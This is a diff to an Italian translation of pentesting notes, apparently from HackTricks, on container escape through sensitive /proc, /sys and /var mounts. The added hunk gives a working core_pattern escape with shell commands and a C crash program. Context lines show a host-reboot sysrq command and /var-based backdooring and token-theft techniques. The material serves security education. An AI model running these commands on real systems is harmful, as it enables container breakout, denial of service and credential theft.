@@ -15,24 +15,36 @@ Questa directory consente l'accesso per modificare le variabili del kernel, di s
 #### **`/proc/sys/kernel/core_pattern`**
 
 - Descritto in [core(5)](https://man7.org/linux/man-pages/man5/core.5.html).
-- Consente di definire un programma da eseguire alla generazione di un file di core con i primi 128 byte come argomenti. Questo può portare all'esecuzione di codice se il file inizia con una pipe `|`.
-- **Esempio di test e sfruttamento**:
+- Se puoi scrivere all'interno di questo file, è possibile scrivere una pipe `|` seguita dal percorso di un programma o script che verrà eseguito dopo che si verifica un crash.
+- Un attaccante può trovare il percorso all'interno dell'host per il suo container eseguendo `mount` e scrivere il percorso a un binario all'interno del file system del suo container. Poi, far crashare un programma per far eseguire il binario al di fuori del container.
 
+- **Esempio di Test e Sfruttamento**:
 ```bash
-[ -w /proc/sys/kernel/core_pattern ] && echo Yes # Test di accesso in scrittura
+[ -w /proc/sys/kernel/core_pattern ] && echo Yes # Test write access
 cd /proc/sys/kernel
-echo "|$overlay/shell.sh" > core_pattern # Imposta gestore personalizzato
-sleep 5 && ./crash & # Attiva gestore
+echo "|$overlay/shell.sh" > core_pattern # Set custom handler
+sleep 5 && ./crash & # Trigger handler
 ```
+Controlla [questo post](https://pwning.systems/posts/escaping-containers-for-fun/) per ulteriori informazioni.
 
+Esempio di programma che si blocca:
+```c
+int main(void) {
+char buf[1];
+for (int i = 0; i < 100; i++) {
+buf[i] = 1;
+}
+return 0;
+}
+```
 #### **`/proc/sys/kernel/modprobe`**
 
 - Dettagliato in [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
 - Contiene il percorso per il caricatore di moduli del kernel, invocato per caricare i moduli del kernel.
-- **Esempio di controllo accesso**:
+- **Esempio di Controllo Accesso**:
 
 ```bash
-ls -l $(cat /proc/sys/kernel/modprobe) # Controlla accesso a modprobe
+ls -l $(cat /proc/sys/kernel/modprobe) # Controlla l'accesso a modprobe
 ```
 
 #### **`/proc/sys/vm/panic_on_oom`**
@@ -48,7 +60,7 @@ ls -l $(cat /proc/sys/kernel/modprobe) # Controlla accesso a modprobe
 #### **`/proc/sys/fs/binfmt_misc`**
 
 - Consente di registrare interpreti per formati binari non nativi basati sul loro numero magico.
-- Può portare a escalation dei privilegi o accesso a shell root se `/proc/sys/fs/binfmt_misc/register` è scrivibile.
+- Può portare a un'elevazione di privilegi o accesso a shell root se `/proc/sys/fs/binfmt_misc/register` è scrivibile.
 - Sfruttamento e spiegazione rilevanti:
 - [Poor man's rootkit via binfmt_misc](https://github.com/toffan/binfmt_misc)
 - Tutorial approfondito: [Video link](https://www.youtube.com/watch?v=WBC7hhgMvQQ)
@@ -63,7 +75,7 @@ ls -l $(cat /proc/sys/kernel/modprobe) # Controlla accesso a modprobe
 #### **`/proc/sysrq-trigger`**
 
 - Consente di invocare comandi Sysrq, potenzialmente causando riavvii immediati del sistema o altre azioni critiche.
-- **Esempio di riavvio dell'host**:
+- **Esempio di Riavvio Host**:
 
 ```bash
 echo b > /proc/sysrq-trigger # Riavvia l'host
@@ -84,7 +96,7 @@ echo b > /proc/sysrq-trigger # Riavvia l'host
 #### **`/proc/[pid]/mem`**
 
 - Interfaccia con il dispositivo di memoria del kernel `/dev/mem`.
-- Storicamente vulnerabile ad attacchi di escalation dei privilegi.
+- Storicamente vulnerabile ad attacchi di elevazione di privilegi.
 - Maggiori informazioni su [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html).
 
 #### **`/proc/kcore`**
@@ -92,7 +104,7 @@ echo b > /proc/sysrq-trigger # Riavvia l'host
 - Rappresenta la memoria fisica del sistema in formato ELF core.
 - La lettura può rivelare i contenuti della memoria del sistema host e di altri container.
 - La grande dimensione del file può portare a problemi di lettura o crash del software.
-- Uso dettagliato in [Dumping /proc/kcore in 2019](https://schlafwandler.github.io/posts/dumping-/proc/kcore/).
+- Utilizzo dettagliato in [Dumping /proc/kcore in 2019](https://schlafwandler.github.io/posts/dumping-/proc/kcore/).
 
 #### **`/proc/kmem`**
 
@@ -106,21 +118,21 @@ echo b > /proc/sysrq-trigger # Riavvia l'host
 
 #### **`/proc/sched_debug`**
 
-- Restituisce informazioni sulla pianificazione dei processi, eludendo le protezioni del namespace PID.
+- Restituisce informazioni sulla pianificazione dei processi, bypassando le protezioni dello spazio dei nomi PID.
 - Espone nomi di processi, ID e identificatori cgroup.
 
 #### **`/proc/[pid]/mountinfo`**
 
-- Fornisce informazioni sui punti di montaggio nel namespace di montaggio del processo.
+- Fornisce informazioni sui punti di montaggio nello spazio dei nomi di montaggio del processo.
 - Espone la posizione del `rootfs` o dell'immagine del container.
 
-### `/sys` Vulnerabilities
+### Vulnerabilità di `/sys`
 
 #### **`/sys/kernel/uevent_helper`**
 
 - Utilizzato per gestire i `uevents` dei dispositivi del kernel.
 - Scrivere in `/sys/kernel/uevent_helper` può eseguire script arbitrari al verificarsi di `uevent`.
-- **Esempio di sfruttamento**: %%%bash
+- **Esempio di Sfruttamento**: %%%bash
 
 #### Crea un payload
 
@@ -152,20 +164,20 @@ cat /output %%%
 
 #### **`/sys/kernel/security`**
 
-- Contiene l'interfaccia `securityfs`, che consente la configurazione dei moduli di sicurezza Linux come AppArmor.
+- Contiene l'interfaccia `securityfs`, che consente la configurazione dei Moduli di Sicurezza Linux come AppArmor.
 - L'accesso potrebbe consentire a un container di disabilitare il proprio sistema MAC.
 
 #### **`/sys/firmware/efi/vars` e `/sys/firmware/efi/efivars`**
 
 - Espone interfacce per interagire con le variabili EFI in NVRAM.
-- Malconfigurazione o sfruttamento possono portare a laptop bloccati o macchine host non avviabili.
+- Una configurazione errata o uno sfruttamento possono portare a laptop bloccati o macchine host non avviabili.
 
 #### **`/sys/kernel/debug`**
 
 - `debugfs` offre un'interfaccia di debug "senza regole" al kernel.
 - Storia di problemi di sicurezza a causa della sua natura illimitata.
 
-### `/var` Vulnerabilities
+### Vulnerabilità di `/var`
 
 La cartella **/var** dell'host contiene socket di runtime del container e i filesystem dei container. Se questa cartella è montata all'interno di un container, quel container avrà accesso in lettura-scrittura ai filesystem di altri container con privilegi di root. Questo può essere abusato per passare tra i container, causare un denial of service o inserire backdoor in altri container e applicazioni che vi girano.
 
@@ -218,7 +230,7 @@ L'XSS è stato ottenuto:
 
 ![Stored XSS via mounted /var folder](/images/stored-xss-via-mounted-var-folder.png)
 
-Nota che il container NON richiede un riavvio o altro. Qualsiasi modifica effettuata tramite la cartella montata **/var** sarà applicata istantaneamente.
+Nota che il container NON richiede un riavvio o altro. Qualsiasi modifica effettuata tramite la cartella montata **/var** verrà applicata istantaneamente.
 
 Puoi anche sostituire file di configurazione, binari, servizi, file di applicazione e profili di shell per ottenere RCE automatico (o semi-automatico).
 
@@ -236,7 +248,7 @@ che consentono al container di ottenere accesso non autorizzato a K8s o al cloud
 ```
 #### Docker
 
-L'exploitation in Docker (o nelle distribuzioni Docker Compose) è esattamente la stessa, tranne per il fatto che di solito i filesystem degli altri container sono disponibili sotto un percorso di base diverso:
+Lo sfruttamento in Docker (o nelle distribuzioni Docker Compose) è esattamente lo stesso, tranne per il fatto che di solito i filesystem degli altri container sono disponibili sotto un percorso di base diverso:
 ```bash
 $ docker info | grep -i 'docker root\|storage driver'
 Storage Driver: overlay2
@@ -254,7 +266,7 @@ drwx--x---  4 root root  4096 Jan  9 21:22 062f14e5adbedce75cea699828e22657c8044
 ```
 #### Nota
 
-I percorsi effettivi possono differire in diverse configurazioni, motivo per cui la tua migliore opzione è utilizzare il comando **find** per localizzare i filesystem degli altri contenitori e i token di identità SA / web.
+I percorsi effettivi possono differire in diverse configurazioni, motivo per cui la tua migliore opzione è utilizzare il comando **find** per localizzare i filesystem degli altri container e i token di identità SA / web.
 
 ### Riferimenti
 
